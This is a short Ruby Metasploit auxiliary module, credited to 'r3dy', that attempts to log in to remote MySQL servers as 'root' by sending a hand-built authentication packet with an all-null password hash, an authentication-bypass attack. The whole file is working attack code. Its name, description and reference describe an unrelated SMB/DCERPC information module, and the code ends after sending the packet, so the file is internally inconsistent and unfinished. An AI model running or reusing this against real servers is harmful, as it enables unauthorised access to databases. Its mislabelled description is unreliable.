
require 'msf/core'
require 'rbmysql'

class Metasploit3 < Msf::Auxiliary
	# Exploit mixins should be called first
	include Exploit::Remote::MYSQL
	# Scanner mixin should be near last
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report


	def initialize
		super(
			'Name'        => 'SMB Server Information',
			'Description' => 'Determine information about a remote system via a DCERPC call to NetServerGetInfo',
			'Author'      => 'r3dy',
			'References'  =>
				[
					[ 'URL', 'http://msdn.microsoft.com/en-us/library/aa370624%28v=vs.85%29.aspx' ]
				],
			'License'     => MSF_LICENSE
		)
		deregister_options('RPORT', 'RHOST')
	end


	def run_host(ip)
		datastore['RPORT'] = 3306
		user = "\x72\x6f\x6f\x74" # user = 'root'
		null = "\x00"
		size = "\x14" # Specify a 20 byte hash size
		bypass = "\x00" * 20 # NULL password
		#First thing we do is bypass authentication and log into the MySQL server as 'root'
		bypasspacket = '' +
			"\x3a\x00\x00\x01\x85\xa6" +
			"\x03\x00\x00" +
			"\x00" +
			"\x00\x01\x08\x00\x00\x00" + # capabilities, max packet, etc..
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00" + user + null + size + bypass
		begin
			connect()
			sock.put(bypasspacket)
		end
	end


end
